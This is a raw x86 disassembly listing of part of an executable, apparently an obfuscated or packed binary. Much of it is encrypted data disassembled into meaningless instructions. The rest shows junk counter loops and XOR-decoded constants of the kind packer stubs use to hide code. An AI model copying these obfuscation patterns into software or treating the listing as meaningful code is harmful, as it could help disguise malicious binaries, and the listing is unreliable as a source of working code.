  40483f:	lea    ecx,[edi-0x19]
  404842:	call   DWORD PTR [ebx-0x15]
  404845:	les    ecx,FWORD PTR [edx+0x59679bdc]
  40484b:	cmc    
  40484c:	lods   eax,DWORD PTR ds:[esi]
  40484d:	or     bl,ah
  40484f:	dec    ecx
  404850:	in     al,dx
  404851:	fist   WORD PTR [eax-0x36]
  404854:	pushf  
  404855:	cs mov dh,0x2f
  404858:	popa   
  404859:	(bad)  
  40485b:	pop    ebx
  40485c:	xchg   esp,eax
  40485d:	add    BYTE PTR [edi+0x20928bd1],0x6
  404864:	mov    esi,0x6dbfb178
  404869:	xchg   DWORD PTR [edx-0x10d9bfd0],eax
  40486f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404870:	inc    edi
  404871:	dec    eax
  404872:	xchg   ebp,eax
  404873:	cmc    
  404874:	imul   ecx,DWORD PTR [eax-0x3a],0xb2e40d2
  40487b:	ds mov cl,0x5b
  40487e:	mov    dl,0xe5
  404880:	shl    BYTE PTR [ecx+ecx*8+0x5e],cl
  404884:	clc    
  404885:	popa   
  404886:	dec    ebx
  404887:	pop    eax
  404888:	into   
  404889:	test   DWORD PTR [ebx+0x4d],ebp
  40488c:	cld    
  40488d:	or     dl,BYTE PTR [eax]
  40488f:	rcr    DWORD PTR [ecx+0x40],cl
  404892:	arpl   WORD PTR [edi-0x23],ax
  404895:	nop
  404896:	addr16 jp 0x40482c
  404899:	jge    0x4048b7
  40489b:	sub    eax,0xdd681da0
  4048a0:	sbb    eax,0x30951641
  4048a5:	es mov ecx,0x2cdeff0c
  4048ab:	jae    0x4048bb
  4048ad:	mov    ebp,0x5cc6273b
  4048b2:	lds    ebp,FWORD PTR [ebp+ecx*4-0x624d41b0]
  4048b9:	adc    eax,0xd6daa0a9
  4048be:	or     BYTE PTR [ebx-0x6],0xf5
  4048c2:	mov    eax,ds:0x144830c8
  4048c7:	xchg   ebx,eax
  4048c8:	mov    eax,ds:0x22903ad6
  4048cd:	jg     0x40492e
  4048cf:	inc    eax
  4048d0:	mov    BYTE PTR fs:[edx-0x8b15cd1],dl
  4048d7:	test   BYTE PTR [esi-0x1e2e9e87],dh
  4048dd:	cli    
  4048de:	add    BYTE PTR [ecx+0x46],ch
  4048e1:	ins    BYTE PTR es:[edi],dx
  4048e2:	adc    ecx,ecx
  4048e4:	pop    edx
  4048e5:	in     eax,dx
  4048e6:	pop    edx
  4048e7:	push   ds
  4048e8:	ja     0x4048ef
  4048ea:	push   ebp
  4048eb:	aad    0xcc
  4048ed:	push   ebp
  4048ee:	mov    dh,0xed
  4048f0:	jle    0x404922
  4048f2:	mov    eax,ds:0x290b8c58
  4048f7:	retf   
  4048f8:	sbb    BYTE PTR [edx],cl
  4048fa:	dec    eax
  4048fb:	loope  0x4048ff
  4048fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fe:	lahf   
  4048ff:	cmp    eax,0xbd4ec547
  404904:	pop    edx
  404905:	pop    ebp
  404906:	inc    ebx
  404907:	not    DWORD PTR [ebp-0x6ddeb7b5]
  40490d:	into   
  40490e:	out    dx,eax
  40490f:	mov    ebx,0xc74b1139
  404914:	es xor eax,0xc5f586c5
  40491a:	lahf   
  40491b:	jae    0x404981
  40491d:	push   edx
  40491e:	mov    BYTE PTR [ebp-0x68724bb1],cl
  404924:	dec    edi
  404925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404926:	scas   al,BYTE PTR es:[edi]
  404927:	or     DWORD PTR ds:0x46a20076,ebx
  40492d:	retf   0xaf5d
  404930:	scas   al,BYTE PTR es:[edi]
  404931:	pop    ecx
  404932:	ror    BYTE PTR [edx+0x4fcefe3f],cl
  404938:	and    DWORD PTR [edi+0x6f],0xffffff9b
  40493c:	out    dx,al
  40493d:	mov    ch,0x53
  40493f:	inc    ecx
  404940:	sbb    ah,BYTE PTR [eax-0x62]
  404943:	psubusw mm3,QWORD PTR [ecx-0x4b6bf271]
  40494a:	xchg   esp,eax
  40494b:	sub    al,0x21
  40494d:	pop    ds
  40494e:	cwde   
  40494f:	push   edi
  404950:	neg    BYTE PTR [edx+ebx*1]
  404953:	xchg   esi,eax
  404954:	or     ebp,DWORD PTR [ecx-0x32]
  404957:	adc    al,0xa4
  404959:	ss dec edx
  40495b:	into   
  40495c:	mov    ds:0x4d06fc70,eax
  404961:	mov    bh,dh
  404963:	sar    BYTE PTR [ebx+0xf],cl
  404966:	mov    DWORD PTR [ebp-0x47],esi
  404969:	lea    esp,[ecx-0x400e15a3]
  40496f:	hlt    
  404970:	fistp  DWORD PTR [edi-0x14add7bc]
  404976:	add    eax,DWORD PTR [ebx+0x17]
  404979:	nop
  40497a:	addr16 inc edi
  40497c:	push   edx
  40497d:	jp     0x4049f5
  40497f:	pop    ebx
  404980:	xor    edx,esi
  404982:	outs   dx,BYTE PTR ds:[esi]
  404983:	jnp    0x404985
  404985:	pusha  
  404986:	lahf   
  404987:	fidiv  WORD PTR [eax-0x1f]
  40498a:	pop    ds
  40498b:	test   DWORD PTR [ecx+0x40b4eacf],0x2872addd
  404995:	ret    
  404996:	ret    0xa812
  404999:	outs   dx,DWORD PTR ds:[esi]
  40499a:	rol    BYTE PTR [edi+0x4d108146],0xdb
  4049a1:	jecxz  0x404936
  4049a3:	mov    ds:0x689344da,eax
  4049a8:	jbe    0x404964
  4049aa:	nop
  4049ab:	fstp   DWORD PTR [eax-0x79]
  4049ae:	fcmovnu st,st(1)
  4049b0:	sbb    ah,dl
  4049b2:	fistp  WORD PTR [ebx]
  4049b4:	mov    ch,bh
  4049b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b7:	cli    
  4049b8:	add    BYTE PTR [edi-0x60],al
  4049bb:	mov    al,0x7
  4049bd:	mov    edi,0x87734e4b
  4049c2:	(bad)  
  4049c3:	call   0xce1057a
  4049c8:	sub    eax,0xc1c2f9b8
  4049cd:	mov    DWORD PTR [eax],ebx
  4049cf:	pop    ss
  4049d0:	add    cl,dl
  4049d2:	jbe    0x404957
  4049d4:	out    0xb5,al
  4049d6:	xchg   edx,eax
  4049d7:	fstp   st(6)
  4049d9:	or     bh,BYTE PTR [eax-0x1dd42382]
  4049df:	scas   eax,DWORD PTR es:[edi]
  4049e0:	inc    esi
  4049e1:	sub    edi,DWORD PTR [ebx-0xf]
  4049e4:	mov    eax,0x6a97f77f
  4049e9:	xchg   DWORD PTR [edx*4+0x48d3858b],edi
  4049f0:	dec    esi
  4049f1:	leave  
  4049f2:	cmp    al,0x42
  4049f4:	and    esp,DWORD PTR [edi+0x71d6b468]
  4049fa:	push   es
  4049fb:	mov    BYTE PTR [eax],dl
  4049fd:	enter  0x721c,0x1d
  404a01:	push   es
  404a02:	ins    BYTE PTR es:[edi],dx
  404a03:	push   ecx
  404a04:	loope  0x4049a3
  404a06:	sahf   
  404a07:	out    dx,al
  404a08:	sbb    bl,bl
  404a0a:	dec    eax
  404a0b:	xchg   DWORD PTR [edx+0x726ae70a],eax
  404a11:	cwde   
  404a12:	out    0x50,al
  404a14:	retf   0xaa43
  404a17:	leave  
  404a18:	push   cs
  404a19:	aaa    
  404a1a:	add    al,0x40
  404a1c:	push   0x49f4e171
  404a21:	push   ds
  404a22:	sub    BYTE PTR [ecx+0x11],bl
  404a25:	mov    DWORD PTR [esp+edi*8],edx
  404a28:	or     DWORD PTR [edx+0x2],ebx
  404a2b:	add    eax,0x38346263
  404a30:	inc    esi
  404a31:	fisub  WORD PTR ds:0xd04e4670
  404a37:	xlat   BYTE PTR ds:[ebx]
  404a38:	test   BYTE PTR [esi+0x44],bh
  404a3b:	mov    ecx,0xcb5d89b6
  404a40:	mul    BYTE PTR [ecx+0x3102f2e0]
  404a46:	ror    BYTE PTR [ecx],1
  404a48:	in     al,dx
  404a49:	jne    0x404ac5
  404a4b:	mov    ds:0xef34c8f1,eax
  404a50:	cmp    al,0xa2
  404a52:	pop    esp
  404a53:	pop    DWORD PTR [ebx+eiz*8+0x7d]
  404a57:	je     0x404aa2
  404a59:	stc    
  404a5a:	(bad)  
  404a5b:	cli    
  404a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a5d:	jmp    0xf8ae:0xdbbb2ade
  404a64:	sub    bh,BYTE PTR [edx-0x27f22f71]
  404a6a:	loopne 0x404a8f
  404a6c:	inc    edx
  404a6d:	js     0x404a84
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx+0x25331198]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	push   ebp
  404b3a:	adc    DWORD PTR [edx+0x3f],ecx
  404b3d:	test   eax,0x19b26705
  404b42:	mov    eax,0xf23c13e6
  404b47:	push   es
  404b48:	repz jno 0x404ad5
  404b4b:	pushf  
  404b4c:	inc    edx
  404b4d:	pop    es
  404b4e:	or     al,0x0
  404b50:	loopne 0x404b46
  404b52:	jno    0x404b85
  404b54:	pop    ebx
  404b55:	lahf   
  404b56:	adc    ah,BYTE PTR [ebp-0x38]
  404b59:	icebp  
  404b5a:	jl     0x404bad
  404b5c:	or     eax,0x37a66d06
  404b61:	and    al,0xf3
  404b63:	mov    dl,0x11
  404b65:	shl    BYTE PTR [eax],1
  404b67:	pushf  
  404b68:	enter  0x8bb3,0xb
  404b6c:	push   0xf1df7316
  404b71:	stc    
  404b72:	mov    al,ds:0xd392be5e
  404b77:	and    eax,DWORD PTR [ebx+0x2]
  404b7a:	xor    ah,BYTE PTR [esi+0x14]
  404b7d:	mov    bl,0x98
  404b7f:	add    ah,BYTE PTR [ebp-0x6f7e100a]
  404b85:	pushf  
  404b86:	sub    DWORD PTR [ecx*2-0x7400a960],ebx
  404b8d:	add    DWORD PTR [ecx-0x69313150],0x37332f5c
  404b97:	xor    dh,BYTE PTR [edx]
  404b99:	mov    dh,0x64
  404b9b:	fs imul esp,esp,0xffffffd4
  404b9f:	(bad)  
  404ba0:	jns    0x404bb9
  404ba2:	stos   BYTE PTR es:[edi],al
  404ba3:	mov    bh,0xdf
  404ba5:	ins    DWORD PTR es:[edi],dx
  404ba6:	add    eax,0x4c5ef729
  404bab:	rol    ax,0x80
  404baf:	sub    cl,bh
  404bb1:	inc    ecx
  404bb2:	push   ecx
  404bb3:	es popf 
  404bb5:	xlat   BYTE PTR ds:[ebx]
  404bb6:	cli    
  404bb7:	in     al,dx
  404bb8:	or     DWORD PTR [edx+0x47ae2970],ebx
  404bbe:	mov    ?,WORD PTR [edx-0x7f]
  404bc1:	idiv   BYTE PTR [edx+0x2f]
  404bc4:	mov    dl,0x68
  404bc6:	inc    edx
  404bc7:	pop    ss
  404bc8:	enter  0xbc89,0x7b
  404bcc:	xor    DWORD PTR [eax+eiz*4+0x12],ebp
  404bd0:	(bad)  
  404bd1:	dec    ebp
  404bd2:	cmp    al,0xde
  404bd4:	dec    edx
  404bd5:	mov    DWORD PTR [edx-0x6b5ea316],ecx
  404bdb:	in     al,dx
  404bdc:	adc    DWORD PTR [ecx-0x21],esp
  404bdf:	mov    dl,0xab
  404be1:	fucomip st,st(0)
  404be3:	adc    al,al
  404be5:	aad    0xa3
  404be7:	stos   DWORD PTR es:[edi],eax
  404be8:	jnp    0x404b97
  404bea:	push   0xffffffdf
  404bec:	jno    0x404bdd
  404bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bef:	jp     0x404bf4
  404bf1:	and    al,0xaa
  404bf3:	jo     0x404c06
  404bf5:	popf   
  404bf6:	(bad)  [esi]
  404bf8:	adc    DWORD PTR [esi+ecx*4+0x13a678b0],ebx
  404bff:	test   eax,0xc69f641d
  404c04:	jmp    0x3aa9a6a0
  404c09:	and    DWORD PTR fs:[eax+0x4],ebx
  404c0d:	stc    
  404c0e:	adc    al,0x53
  404c10:	mov    esi,0xbdf18d42
  404c15:	adc    DWORD PTR [ecx],edi
  404c17:	inc    edx
  404c18:	fcmovu st,st(5)
  404c1a:	push   esp
  404c1b:	imul   ebx,DWORD PTR [edi],0xffffffa5
  404c1e:	lea    edi,[ebp+edx*8-0x53d0ed8]
  404c25:	aas    
  404c26:	xchg   esp,eax
  404c27:	mov    esp,0xd39ea2bf
  404c2c:	das    
  404c2d:	cmp    dl,BYTE PTR [ebx+0x2d086d43]
  404c33:	imul   DWORD PTR [edi+0xfec8baf]
  404c39:	and    al,0x9d
  404c3b:	pop    es
  404c3c:	shl    DWORD PTR [ebp+0x18d94667],cl
  404c42:	xchg   ebp,eax
  404c43:	mov    dh,0x7
  404c45:	cmp    BYTE PTR [ebp+0x6e],0xc4
  404c49:	sub    DWORD PTR [ebp+eax*8+0x48],0x68
  404c4e:	(bad)  
  404c4f:	and    bl,cl
  404c51:	mov    dh,0x5c
  404c53:	sbb    eax,esi
  404c55:	div    BYTE PTR [eax+0xa]
  404c58:	adc    DWORD PTR [ebp+0x59604b50],0xffffffea
  404c5f:	mov    es,ecx
  404c61:	or     eax,0x5098ea19
  404c66:	rol    DWORD PTR [ecx],1
  404c68:	mov    bh,0xd3
  404c6a:	pop    ds
  404c6b:	jmp    0x404c59
  404c6d:	aas    
  404c6e:	mov    cl,0xc
  404c70:	jbe    0x404c8a
  404c72:	jmp    0xb3af:0xf1ca6d8e
  404c79:	push   esp
  404c7a:	push   esi
  404c7b:	push   esp
  404c7c:	and    BYTE PTR [ebx+0x53],ah
  404c7f:	in     al,0x6f
  404c81:	push   eax
  404c82:	aad    0x82
  404c84:	jo     0x404c2b
  404c86:	xor    esp,DWORD PTR [ebx-0x17d3955a]
  404c8c:	pop    edi
  404c8d:	sbb    eax,0xf75ec6ef
  404c92:	inc    ebp
  404c93:	adc    eax,0xe9ba59ae
  404c98:	je     0x404c60
  404c9a:	pop    edi
  404c9b:	mov    al,0xc5
  404c9d:	(bad)  
  404c9e:	push   edx
  404c9f:	(bad)  
  404ca1:	adc    BYTE PTR [ecx+edx*8+0x13f5384d],0xe9
  404ca9:	fisttp WORD PTR [edx-0x63]
  404cac:	lods   eax,DWORD PTR ds:[esi]
  404cad:	retf   0x74d0
  404cb0:	push   ebp
  404cb1:	mov    ah,BYTE PTR [edi+0x2311a0d9]
  404cb7:	dec    ebx
  404cb8:	pop    esp
  404cb9:	fldenv [edi-0x7d]
  404cbc:	mov    edx,0xe5dcac6d
  404cc1:	sub    eax,ecx
  404cc3:	ss adc edi,esp
  404cc6:	les    ebx,FWORD PTR [ebx]
  404cc8:	xor    edi,DWORD PTR [ebx]
  404cca:	loopne 0x404cd6
  404ccc:	adc    eax,0xefb2d341
  404cd1:	jns    0x404ce2
  404cd3:	ss mov esi,0x9bcd98d1
  404cd9:	cli    
  404cda:	inc    edx
  404cdb:	mov    edx,0x8c6e1ba7
  404ce0:	jmp    0x404ccb
  404ce2:	sub    al,0xa0
  404ce4:	mov    esi,0x5b672cf3
  404ce9:	test   DWORD PTR [esi+0x35a4b5a3],0x488142d9
  404cf3:	or     eax,0x58615656
  404cf8:	scas   eax,DWORD PTR es:[edi]
  404cf9:	mov    al,0x16
  404cfb:	lods   al,BYTE PTR ds:[esi]
  404cfc:	int3   
  404cfd:	push   ebp
  404cfe:	stos   BYTE PTR es:[edi],al
  404cff:	in     eax,dx
  404d00:	sbb    DWORD PTR [esi+edx*2],edx
  404d03:	jmp    0x6fed:0xe473fc68
  404d0a:	mov    WORD PTR ds:0x7b09fd6c,?
  404d10:	adc    BYTE PTR [ebx-0x3],dh
  404d13:	mov    BYTE PTR [edi],cl
  404d15:	pushf  
  404d16:	and    cl,al
  404d18:	bound  eax,QWORD PTR [ebp-0x19]
  404d1b:	cli    
  404d1c:	mov    ebp,0xae43fe9f
  404d21:	pop    ds
  404d22:	fcmovb st,st(4)
  404d24:	add    eax,0x66216fe0
  404d29:	mul    BYTE PTR [esi]
  404d2b:	and    eax,0xf9562ebd
  404d30:	pop    ds
  404d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d32:	dec    ebx
  404d33:	repz sbb BYTE PTR [edi],0x6f
  404d37:	icebp  
  404d38:	sub    DWORD PTR [edx+ebp*2+0x12c4c473],ecx
  404d3f:	inc    edi
  404d40:	jb     0x404db9
  404d42:	vpminub ymm6,ymm7,YMMWORD PTR [eax]
  404d46:	inc    edi
  404d47:	sbb    al,0x41
  404d49:	repz and DWORD PTR [esi-0x60f8747d],ebp
  404d50:	pop    ebp
  404d51:	dec    ebp
  404d52:	and    al,0x76
  404d54:	add    BYTE PTR [esi-0x5bdcf9ca],0xce
  404d5b:	std    
  404d5c:	das    
  404d5d:	dec    ebp
  404d5e:	add    BYTE PTR [ebx-0x36816f90],0x70
  404d65:	mov    al,0xef
  404d67:	inc    esp
  404d68:	cmc    
  404d69:	sbb    al,0x3e
  404d6b:	mov    edi,0x935030fa
  404d70:	adc    al,bl
  404d72:	in     eax,0x1e
  404d74:	jne    0x404d53
  404d76:	mov    ebx,0x4352213a
  404d7b:	mov    eax,0xf818bc29
  404d80:	push   0xb8df9ef6
  404d85:	std    
  404d86:	sti    
  404d87:	pop    ebx
  404d88:	in     al,dx
  404d89:	rcl    DWORD PTR [ebx-0x175d17b8],cl
  404d8f:	inc    eax
  404d90:	cdq    
  404d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d92:	jle    0x404d24
  404d94:	nop
  404d95:	in     al,dx
  404d96:	jle    0x404d1d
  404d98:	inc    edx
  404d99:	stos   BYTE PTR es:[edi],al
  404d9a:	dec    esp
  404d9b:	adc    esi,DWORD PTR [ebx]
  404d9d:	xchg   BYTE PTR [edi+0x47a6c220],al
  404da3:	sub    dl,bh
  404da5:	ds icebp 
  404da7:	in     al,dx
  404da8:	addr16 lahf 
  404daa:	repnz adc BYTE PTR [eax],bh
  404dad:	sbb    BYTE PTR [edx+0x385f1856],ah
  404db3:	mov    bl,0x1e
  404db5:	adc    edx,DWORD PTR [edi+ecx*1+0x42]
  404db9:	add    eax,0x7268e53e
  404dbe:	fstp   DWORD PTR [eax-0x38ca9220]
  404dc5:	jecxz  0x404d4e
  404dc7:	cmp    eax,0x842019d7
  404dcc:	bound  edi,QWORD PTR [eax+esi*2-0x4386d402]
  404dd3:	fcom   st(4)
  404dd5:	dec    esi
  404dd6:	aam    0x94
  404dd8:	push   0xf918d589
  404ddd:	in     al,0xa8
  404ddf:	mov    edx,0xccbb7f62
  404de4:	loopne 0x404e01
  404de6:	cmp    edi,DWORD PTR [ebx+edx*2-0x18874fb6]
  404ded:	pop    eax
  404dee:	gs cld 
  404df0:	pop    ds
  404df1:	xor    al,0x76
  404df3:	clc    
  404df4:	shl    BYTE PTR [edi+ecx*1],1
  404df7:	sar    al,cl
  404df9:	lods   al,BYTE PTR ds:[esi]
  404dfa:	cmp    edx,DWORD PTR [edx+0x2438b715]
  404e00:	push   0xf1230969
  404e05:	mov    bl,bl
  404e07:	and    eax,0x186304e7
  404e0c:	inc    DWORD PTR [ebx+0x462b93ed]
  404e12:	push   cs
  404e13:	std    
  404e14:	sub    al,0x38
  404e16:	sbb    DWORD PTR [ebx+0x6107a973],esi
  404e1c:	add    al,0xab
  404e1e:	xchg   DWORD PTR [ecx+0x1c],ecx
  404e21:	mov    ch,0x2a
  404e23:	mov    ds:0xf0af6d95,al
  404e28:	je     0x404e08
  404e2a:	xchg   edi,eax
  404e2b:	ret    0x9e9c
  404e2e:	daa    
  404e2f:	clc    
  404e30:	pop    eax
  404e31:	imul   ebp,DWORD PTR [edx-0x364ff32a],0x84642ffd
  404e3b:	call   0x88e3dbe2
  404e40:	cli    
  404e41:	mov    esp,0x3a0692e6
  404e46:	jb     0x404dd9
  404e48:	push   edx
  404e49:	fcom   QWORD PTR [edx]
  404e4b:	sub    BYTE PTR [eax-0x16],cl
  404e4e:	cld    
  404e4f:	adc    ecx,DWORD PTR [eax+0x7503dba7]
  404e55:	pop    eax
  404e56:	arpl   di,cx
  404e58:	mov    dh,0xb6
  404e5a:	outs   dx,BYTE PTR ds:[esi]
  404e5b:	inc    esi
  404e5c:	push   ecx
  404e5d:	icebp  
  404e5e:	mov    BYTE PTR [ebx+0x4c876708],al
  404e64:	adc    DWORD PTR [ebp-0x26],edx
  404e67:	in     eax,0x17
  404e69:	or     al,0x18
  404e6b:	jmp    0x404edd
  404e6d:	lahf   
  404e6e:	ds jg  0x404dff
  404e71:	fsubr  DWORD PTR [esi-0xb]
  404e74:	cld    
  404e75:	push   0x8108558b
  404e7a:	rcr    DWORD PTR [ecx+0x73],1
  404e7d:	add    BYTE PTR [eax],al
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	neg    ebx
  405186:	xlat   BYTE PTR ds:[ebx]
  405187:	mov    esp,0x7e7e28f4
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x40512e
  405191:	inc    eax
  405192:	mov    BYTE PTR ds:0x50129d2d,0xf4
